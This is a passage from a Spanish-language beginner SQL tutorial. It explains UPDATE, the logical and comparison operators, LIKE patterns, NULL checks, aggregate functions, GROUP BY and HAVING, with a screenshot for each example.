&lt;p&gt;Para actualizarlo debemos de ejecutar la instrucción &lt;code&gt;UPDATE&lt;/code&gt; mas el nombre de la tabla &lt;code&gt;Estudiantes&lt;/code&gt;, despues con &lt;code&gt;SET&lt;/code&gt; espeficamos la columna con el valor que deseamos cambiar &lt;code&gt;Edades = 30&lt;/code&gt; y finalmente la condición con &lt;code&gt;WHERE&lt;/code&gt; donde especificamos el resgistro especifico en nuestro caso donde el &lt;code&gt;Nombre = &quot;Juan&quot;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql23.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al ver nuevamente nuestra tabla &lt;code&gt;Estudiantes&lt;/code&gt;, ahora en el campo edad nuestro usuario tiene el valor de 30.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql24.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;operadores-en-sql&quot;&gt;OPERADORES EN SQL &lt;a href=&quot;#operadores-en-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los operadores son palabras clave en &lt;code&gt;SQL&lt;/code&gt; que utilizamos para realizar comparaciones, calculo y combinar condiciones en las consultas y espresiones &lt;code&gt;SQL&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;operadores-and-y-or&quot;&gt;OPERADORES AND Y OR &lt;a href=&quot;#operadores-and-y-or&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vimos anteriormente que con &lt;code&gt;WHERE&lt;/code&gt; podemos aplicar condiciones, pero en muchas ocasiones vamos a querer ejecutar multiples condiciones, y para poder hacerlo tendremos que usar &lt;code&gt;AND o OR&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;operador-and&quot;&gt;OPERADOR AND &lt;a href=&quot;#operador-and&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si ya tenemos conocimientos premios en cualquier lenguaje de programación, podemos sobreentender lo que hace &lt;code&gt;AND&lt;/code&gt;, que basicamente nos devuelve un resultado de cumplirse ambas condiciones.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora para el siguiente ejemplo vamos a seleccionar de la tabla &lt;code&gt;Customers&lt;/code&gt; solo aquellos donde el pais sea &lt;code&gt;Spain&lt;/code&gt; y la ciudad sea &lt;code&gt;Madrid&lt;/code&gt;, en caso se cumplan ambas condicones quiero que me devuelva los registros.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query22.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;operador-or&quot;&gt;OPERADOR OR &lt;a href=&quot;#operador-or&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Al contrario que el and, &lt;code&gt;OR&lt;/code&gt; nos devuelve un resultado al cumplirse alguna de las dos condiones, no valida que se cumplan ambas ya que con solo cumplirse una de ellas esta nos devolvera un registro.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Supongamos vamos a hacer una consulta donde, queremos seleccionar a los clientes que son del pais de &lt;code&gt;Argentina&lt;/code&gt; o que sean de la cuidad de &lt;code&gt;Barcelona&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query23.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como resultado tenemos registros donde los clientes son de &lt;code&gt;Argentina&lt;/code&gt; y tambien a los clientes que son de la ciudad de &lt;code&gt;Barcelona&lt;/code&gt; ya que con &lt;code&gt;OR&lt;/code&gt; solo una de las condiones debe cumplirse para que me devuelva los registros.&lt;/p&gt;

&lt;h2 id=&quot;operador-not&quot;&gt;OPERADOR NOT &lt;a href=&quot;#operador-not&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Lo que hacemos con &lt;code&gt;NOT&lt;/code&gt; es simplemente negar la sentencia que realizamos, de este modo al agregar el &lt;code&gt;NOT&lt;/code&gt; el resultado que nos mostrara vendra a ser lo contrario a nuestra condicion en nuestra consulta.&lt;/p&gt;

&lt;p&gt;Si quedriamos realizar una consulta donde queremos obtener los precios que sean mayores a &lt;code&gt;80&lt;/code&gt; de la tabla productos, si ejecutamos la consulta esta nos mostrara exactamente lo que queremos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query25.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero si usamos &lt;code&gt;NOT&lt;/code&gt; lo que se hace es negar la consulta y hacer lo contrario, basicamente con &lt;code&gt;NOT&lt;/code&gt; le diriamos mediante una consulta que nos seleccione los precios donde &lt;code&gt;NO&lt;/code&gt; sean mayores a &lt;code&gt;80&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query24.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;operador-limit&quot;&gt;OPERADOR LIMIT &lt;a href=&quot;#operador-limit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Cuando queremos limitar el numero de registros que nos arroja una consulta usamos &lt;code&gt;LIMIT&lt;/code&gt;, con ello limitamos el numero de registros a cuantos queramos especificando la cantidad total en numeros despues de &lt;code&gt;LIMIT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Supongamos que ahora queremos ejecutar una consulta que nos muestre de manera ordenada los precios de la tabla de los &lt;code&gt;Products&lt;/code&gt;, eso lo hariamos facilmente utilizando &lt;code&gt;ORDER BY&lt;/code&gt; . Pero en esta ocasión de esos precios ordenados solo queremos que se nos muestre los 5 primeros registros, pues ahi es donde vamos a utilizar el &lt;code&gt;LIMIT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query26.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y de esta manera tendriamos el precio de los 5 produtos mas caros.&lt;/p&gt;

&lt;p&gt;De la misma manera podriamos modificar la consulta y usar &lt;code&gt;ASC&lt;/code&gt; y de esta manera nos mostraria los 5 productos de menor precio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query27.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;operador-distinct&quot;&gt;OPERADOR DISTINCT &lt;a href=&quot;#operador-distinct&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Este operador funciona de manera bastante similiar a &lt;code&gt;NOT&lt;/code&gt; ya que cuando lo usamos nos ejecuta exactamente lo contrario o distinto a la consulta, pero no es exactamente igual ya que &lt;code&gt;!=&lt;/code&gt; es un operador de comparación y se ejecuta realizando una comparación con todos los registros hasta validar uno correcto.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En cambio &lt;code&gt;NOT&lt;/code&gt; al ser un operador logico, trabaja haciendo la comparación directamente entre dos valores &lt;code&gt;booleanos&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si lo aplicamos &lt;code&gt;!=&lt;/code&gt; a efectos practicos en una consulta esta nos arrojara valores distintos al que especifiquemos, pero ahora ya tenemos en cuenta que no es lo mismo que usar &lt;code&gt;NOT&lt;/code&gt; aunque ambos se asemejen mucho.&lt;/p&gt;

&lt;h2 id=&quot;operador-between&quot;&gt;OPERADOR BETWEEN &lt;a href=&quot;#operador-between&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es un operador de comparación que se utiliza para seleccionar valores en un rango especifico, estos datos pueden ser de tipos numericos, fecha o texto.&lt;/p&gt;

&lt;p&gt;Veamos un ejemplo donde vamos a seleccionar un rango de precios de nuestra tabla &lt;code&gt;Products&lt;/code&gt;, que iran desde &lt;code&gt;40 a 50&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query28.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que la consulta nos arroja unicamente los precios del rango establecido y de esta manera podemos simplificar nuestra consulta usando &lt;code&gt;BETWEEN&lt;/code&gt; y de esta manera optimizamos nuestras consultas.&lt;/p&gt;

&lt;p&gt;Podemos tambien en vez de especicar un rango basandonos en un dato numerico, usar un dato de tipo fecha.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query28.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera podemos filtrar por un rango de fecha de nacimiento que corresponde a nuestros empleados de nuestra tabla &lt;code&gt;Employees&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query29.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;operador-like&quot;&gt;OPERADOR LIKE &lt;a href=&quot;#operador-like&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;El operador &lt;code&gt;LIKE&lt;/code&gt;, lo usamos para hacer un filtro basandonos en patrones de cadena de texto, parecido a una expresión regular pero sin llegar a esa complejidad.&lt;/p&gt;

&lt;p&gt;Para poder comprenderlo mejor vamos a usarlo para poder filtrar por cadenas de texto especificas en nuestra tabla de clients &lt;code&gt;Customers&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Realizaremos una consulta donde seleccionemos todos los datos del nombre de contacto &lt;code&gt;ContactName&lt;/code&gt; de nuesta tabla &lt;code&gt;Customers&lt;/code&gt; , donde con &lt;code&gt;LIKE&lt;/code&gt; le especificamos que la cadena de texto especifico por la cual filtraremos, empieze con cualquier valor pero que termine con la palabra “Devon”.&lt;/p&gt;

&lt;p&gt;Esto lo hacemos anteponiendo el &lt;code&gt;%&lt;/code&gt; y seguidamente el texto por el cual queremos filtrar &lt;code&gt;&quot;%TEXTO&quot;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query30.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Del mismo modo si quisieramos que el filtrado sea parecido, pero que esta vez que el filtro empieze por un texto especifico y termine el cualquier cosa, solo debemos poder el &lt;code&gt;%&lt;/code&gt;al final &lt;code&gt;TEXTO%&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query31.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero tambien existe una forma de realizar un filtro, donde especifiquemos el texto independientemente comienze o termine, y que nos encuentre un resultado cuando unicamente contenga el texto.&lt;/p&gt;

&lt;p&gt;Para ello usamos al inicio y al final &lt;code&gt;%&lt;/code&gt; y de esta manera especificamos que no importa si comienze o  termine con algo especifico, simplemente nos imprime la consulta si encuentra un match o coincidencia.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query31.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta forma la consulta nos arroja varias coincidencias donde se cumple la condición.&lt;/p&gt;

&lt;p&gt;Ahora tambien podemos hacer otro tipo de filtrado usando &lt;code&gt;LIKE&lt;/code&gt;, supongamos queremos realizar una consulta donde buscamos filtrar en nuestra tabla &lt;code&gt;Employees&lt;/code&gt;, un nombre el cual comienze con la letra &lt;code&gt;N&lt;/code&gt;, termine con la letra &lt;code&gt;Y&lt;/code&gt; y ademas el nombre solo tenga cinco caracteres.&lt;/p&gt;

&lt;p&gt;En ese caso usaremos &lt;code&gt;_&lt;/code&gt;, para especificar el numero total de caracteres desconocidos y en los extremos poner las letras conocidas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query33.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cada uno de los guiones bajos &lt;code&gt;_&lt;/code&gt;, hace referencia a un caracter el cual puede ser cualquiera incluidos espacios.&lt;/p&gt;

&lt;h2 id=&quot;operador-is-null-y-is-not-null&quot;&gt;OPERADOR IS NULL Y IS NOT NULL &lt;a href=&quot;#operador-is-null-y-is-not-null&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;En sql un valor &lt;code&gt;NULL&lt;/code&gt;, representa un valor desconocido, cuando insertamos filas en una tabla, sin asignarles un valor, estas automaticamente toman el valor nulo &lt;code&gt;NULL&lt;/code&gt;. Este valor al ser especial no podemos compararlo con operadores aritmeticos normales, en su lugar debemos usar los operadores &lt;code&gt;IS o IS NOT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si seleccionamos todo de la tabla &lt;code&gt;Products&lt;/code&gt; y aplicamos un ordenamiento basandonos en &lt;code&gt;ProductName&lt;/code&gt;, por defecto esta nos devolvera al inicio los valores &lt;code&gt;NULL&lt;/code&gt;, de existir estos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query34.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero si aplicamos la condición donde vamos a indicarle que nos devuelvan solo los valores &lt;code&gt;NULL&lt;/code&gt;. Para ello usamos &lt;code&gt;IS NULL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query35.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y si al contrario me molestan ver los valores nulos y quiero quitarlos, pues usamos &lt;code&gt;IS NOT NULL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query36.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;la consulta nos devolvera todos los valores a excepción de los valores &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;operador-in-y-not-in&quot;&gt;OPERADOR IN Y NOT IN &lt;a href=&quot;#operador-in-y-not-in&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Estos operadores simplifican el uso de usar multiples veces el operador &lt;code&gt;AND y OR&lt;/code&gt; al establecer multiples condiciones, ya que opera dentro de una lista de valores similar a una tupla &lt;code&gt;(valor1, valor2, valor3. valor4)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Supongamos queremos listar varios &lt;code&gt;ProductID&lt;/code&gt; de la tabla &lt;code&gt;Products&lt;/code&gt;, en ese caso deberiamos ejecutar la siguiente consulta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query37.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Obtendriamos el resultado deseado, pero escribiriamos muchas lineas de codigo, lo que no seria optimo y mas bien tedioso. Justo en estos casos usamos &lt;code&gt;IN&lt;/code&gt; y de esta manera podemos operar sobre un grupo de valores y reducir varias lineas de nuestra consulta, y logrando que sea mas optima.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query38.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De la misma manera con &lt;code&gt;NOT IN&lt;/code&gt;, hacemos exactamente el mismo proceso, solo que esta vez al usar el &lt;code&gt;NOT&lt;/code&gt; se ejecutara lo contrario y imprimira los valores que no correspondan.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query39.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;comentarios-en-sql&quot;&gt;COMENTARIOS EN SQL &lt;a href=&quot;#comentarios-en-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;En &lt;code&gt;SQL&lt;/code&gt; como en distintos lenguajes de programación usamos los comentarios para añadir una descripción al proposito de nuestro codigo.&lt;/p&gt;

&lt;h3 id=&quot;comentar-una-linea&quot;&gt;COMENTAR UNA LINEA &lt;a href=&quot;#comentar-una-linea&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;En &lt;code&gt;SQL&lt;/code&gt; usamos los &lt;code&gt;--&lt;/code&gt; para poder comentar una linea de codigo. &lt;code&gt;/*COMENTARIO*/&lt;/code&gt; si queremos comentar varias lineas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query47.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;comentar-varias-lineas&quot;&gt;COMENTAR VARIAS LINEAS &lt;a href=&quot;#comentar-varias-lineas&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Si queremos comentar varias lineas de codigo usamos &lt;code&gt;/*COMENTARIO*/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query48.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;funciones-de-agregacion&quot;&gt;FUNCIONES DE AGREGACION &lt;a href=&quot;#funciones-de-agregacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Las funciones de agregación nos permiten efectuar operaciones sobre un conjunto de resultados, pero devolviendo un unico valor para todos ellos. En palabras mas simples nos permite obtener la media, maximos, minimos, sumantorias entre otras operaciones.&lt;/p&gt;

&lt;p&gt;Estas funciones se utilizan con la clausula &lt;code&gt;SELECT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Veamos a continuación algunas de estas funciones:&lt;/p&gt;

&lt;h2 id=&quot;funcion-sum&quot;&gt;FUNCION SUM &lt;a href=&quot;#funcion-sum&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La función &lt;code&gt;SUM&lt;/code&gt; nos devuelve la suma de los valores de un campo que especifiquemos, cabe mencionar que solo podemos usar esta función en valores numericos.&lt;/p&gt;

&lt;p&gt;Por ejemplo si deseamos sumar todos los precios &lt;code&gt;Price&lt;/code&gt; de la tabla &lt;code&gt;Products&lt;/code&gt;, emitiriamos la siguiente consulta:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query40.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Donde dentro de los &lt;code&gt;()&lt;/code&gt; de la función &lt;code&gt;SUM&lt;/code&gt;, especifiriamos el campo el cual queremos sumar.&lt;/p&gt;

&lt;p&gt;Aqui para tener una apreciación mejor podriamos crearnos un &lt;code&gt;ALIAS&lt;/code&gt; y establecer el nuevo campo como &lt;code&gt;SUMA_TOTAL_PRECIOS&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query41.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;funcion-count&quot;&gt;FUNCION COUNT &lt;a href=&quot;#funcion-count&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Esta función nos devuelve el numeros total de las filas seleccionadas.&lt;/p&gt;

&lt;p&gt;De la misma manera debemos especificar dentro de &lt;code&gt;()&lt;/code&gt; el campo cuando agregemos la función &lt;code&gt;COUNT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query42.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La consulta nos devuelve el total de filas del campo &lt;code&gt;ProductName&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;funcion-min&quot;&gt;FUNCION MIX &lt;a href=&quot;#funcion-min&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La función &lt;code&gt;MIN&lt;/code&gt; nos devuelve el minimo valor de un campo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query43.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al aplicar la función en el campo &lt;code&gt;Price&lt;/code&gt;, obtenemos el valor del precio minimo.&lt;/p&gt;

&lt;h2 id=&quot;funcion-max&quot;&gt;FUNCION MAX &lt;a href=&quot;#funcion-max&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;Max&lt;/code&gt; nos devuelve el maximo valor del campo espeficado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query44.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aplicando la función en el mismo campo &lt;code&gt;Price&lt;/code&gt;, obtenemos el valor del precio maximo.&lt;/p&gt;

&lt;h2 id=&quot;funcion-avg&quot;&gt;FUNCION AVG &lt;a href=&quot;#funcion-avg&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La función &lt;code&gt;AVG&lt;/code&gt;, nos devuelve como resultado el promedio del campo que especifiquemos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query45.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como se resultado obtenemos el promedio de los precio de el campo &lt;code&gt;Price&lt;/code&gt;, pero vemos que nos muestra un valor con muchas decimales, en ese caso podemos utilizar la función &lt;code&gt;ROUND&lt;/code&gt; para redondear el valor.&lt;/p&gt;

&lt;h2 id=&quot;funcion-round&quot;&gt;FUNCION ROUND &lt;a href=&quot;#funcion-round&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como mencionamos anteriormente esta función nos va a redondear un valor, dandonos como resultado el valor entero.&lt;/p&gt;

&lt;p&gt;Podemos aplicarlo a nuestra consulta anterior donde obteniamos el promedio, para que nos devuelva un valor entero.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query46.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aplicamos &lt;code&gt;ROUND&lt;/code&gt; encima de la función &lt;code&gt;AVG&lt;/code&gt; y obtenemos el promedio redondeado.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Estas funciones mencionadas son las basicas de &lt;code&gt;SQL&lt;/code&gt; y ademas las mas utilizadas, ya que cada gestor ofrece su propio conjunto mas amplio con otras funciones mas particulares.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;clausula-group-by&quot;&gt;CLAUSULA GROUP BY &lt;a href=&quot;#clausula-group-by&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La clausula &lt;code&gt;GROUP BY&lt;/code&gt;, la utilizamos para agrupar uno o varios registros segun uno o varios valores de la columna.&lt;/p&gt;

&lt;p&gt;Como vemos a continuación tenemos el detalle de las ventas de los productos, pero si nosotros qusieramos obtener la cantidad de ventas por producto. En este caso usariamos la clausula &lt;code&gt;GROUP BY&lt;/code&gt; y de este modo obtendriamos un ordenamiento de cada producto segun su cantidad.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Supongamos que queremos obtener el promedio del precio de lo que cuestan los productos que ofrece cada proveedor.&lt;/p&gt;

&lt;p&gt;Primero seleccionaremos el campo id del proveedor &lt;code&gt;SupplierID&lt;/code&gt; y el promedio redondeado de la tabla &lt;code&gt;Products&lt;/code&gt;. Esto nos dara como resultado el promedio total de los productos y el id que nos mostrara sera el primero, ya que como estamos usando una &lt;code&gt;función de agregación&lt;/code&gt; esta solo devuelve un unico valor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query49.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y si ahora utilizamos &lt;code&gt;GROUP BY&lt;/code&gt; en el campo &lt;code&gt;SupplierID&lt;/code&gt;, lo que hara sera agruparnos por cada uno de los &lt;code&gt;SupplierID&lt;/code&gt; correspondientes a cada proveedor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query50.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como resultado obtendriamos el promedio del precio &lt;code&gt;Price&lt;/code&gt; de los productos que ofrece cada uno de nuestros proveedores.&lt;/p&gt;

&lt;p&gt;Y que hacemos si ahora que obtuvimos el promedio queremos verlos en orden. Pues simplemente como vimos anteriormente agregaremos a nuestra consulta un &lt;code&gt;ORDER BY DESC&lt;/code&gt; y de esta manera verias los promedios ordenador de mayor a menor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query51.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que pasa si queremos usar una condición en esta consulta, donde solo nos muestre el promedio &lt;code&gt;PRECIO_PROMEDIO&lt;/code&gt; obtenido, pero solo si es mayor a 40.&lt;/p&gt;

&lt;p&gt;Entonces automaticamente uno pensaria en usar una condición &lt;code&gt;WHERE&lt;/code&gt;, pero esta nos arroja un error.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query52.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seguro te preguntaras por que me esta arrojando un error si estoy estableciendo una condición correctamente?&lt;/p&gt;

&lt;p&gt;Pues esto se debe a que &lt;code&gt;WHERE&lt;/code&gt; trabaja haciendo un filtro de registros y en este caso al estar trabajando con &lt;code&gt;GROUP BY&lt;/code&gt; y con una &lt;code&gt;función de agregación&lt;/code&gt;, pasariamos a estar trabajando con grupos y por ese motivo &lt;code&gt;WHERE&lt;/code&gt; en este caso siempre nos daria un error.&lt;/p&gt;

&lt;h2 id=&quot;clausula-having&quot;&gt;CLAUSULA HAVING &lt;a href=&quot;#clausula-having&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Anteriormente mencionamos que al trabajar con &lt;code&gt;GROUP BY&lt;/code&gt;, pasariamos de tratar con registros a hacer un filtrado por grupos. Por tanto asi como &lt;code&gt;WHERE&lt;/code&gt; realiza un filtrado por registros, cuando queremos ejecutar condiciones en grupos usamos la clausula &lt;code&gt;HAVING&lt;/code&gt; que funciona exactamente igual a &lt;code&gt;WHERE&lt;/code&gt; pero cabe mencionarlo nuevamente lo usamos cuando trabajamos con grupos.&lt;/p&gt;

&lt;p&gt;Por lo tanto recordando nuestra anterior consulta donde queriamos que se nos muestre &lt;code&gt;PRECIO_PROMEDIO&lt;/code&gt;, pero solo si este era mayor a 40, nuestra consulta seria la siguiente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query53.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Veamos un nuevo ejemplo para que nos quede completamente claro. Vamos a suponer que queremos obtener cual fue el producto mas vendido del total de ventas.&lt;/p&gt;

&lt;p&gt;Para ello usaremos la tabla de los detalles de la orden &lt;code&gt;OrderDetails&lt;/code&gt;, donde seleccionaremos el campo de &lt;code&gt;ProductID&lt;/code&gt; y el de &lt;code&gt;Quantity&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query54.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues aplicaremos la función de agregación &lt;code&gt;SUM()&lt;/code&gt; para sumar las cantidades &lt;code&gt;Quantity&lt;/code&gt; y las agruparemos con &lt;code&gt;GROUP BY&lt;/code&gt; por el id del producto &lt;code&gt;ProductID&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query55.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera obtendremos la cantidad de productos agrupados segun el id de producto &lt;code&gt;ProductID&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Finalmente aplicaremos un ordenamiento &lt;code&gt;ORDER BY&lt;/code&gt; por &lt;code&gt;CANTIDAD_TOTAL&lt;/code&gt; de manera descendente y como solo queremos que se muestre el &lt;code&gt;ProductID&lt;/code&gt; que mas se vendio usamos un &lt;code&gt;LIMIT 1&lt;/code&gt; y obtendriamos el resultado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query56.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

